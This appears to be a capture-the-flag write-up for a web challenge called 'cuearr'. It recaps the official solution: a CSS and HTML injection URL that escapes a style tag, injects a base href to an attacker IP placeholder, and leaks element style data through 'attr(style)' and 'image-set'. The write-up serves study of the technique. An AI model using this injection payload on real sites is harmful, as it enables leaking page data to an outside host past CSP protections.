# cuearr

## Resource

`app.js`  
`bot.js`  
`DockerFile`

## Author

strellic

## Solution

> I didn't solve it during CTF. This is a recap by the offical solution  
> `http://localhost:3000/qr?custom=webkitTextSecurity:circle&bg=%3C/style%3E%3Cbase/href=//0xHEX_IP%3E&white=%3Cstyle%3E.black{--x:attr(style);/*&black=*/mask:image-set(var(--x))}`

Basically use only CSS injection to leak `div` elements' style and class name. The exploit is based on the color input can escape from `style` tag, which enable we add arbitaray HTML tag(but there are CSP rules).  
The key things are getting style properties by `--x:attr(style)`(set `x` equal to style of element), `mask:image-set(var(--x))}` to send request to our website, and add CSS like `webkitTextSecurity:circle` to make origin style became valid URL.  
If we use origin style directly, there will be error when we send request like

```log
Access to image at 'grid-area: 8 / 44;' from origin 'http://localhost:3000' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: chrome, chrome-extension, chrome-untrusted, data, http, https, isolated-app.
```

But if we make it `-webkit-text-security: circle; grid-area: 8 / 38;` by add `webkit` property in front, it will be sent sucessfully.
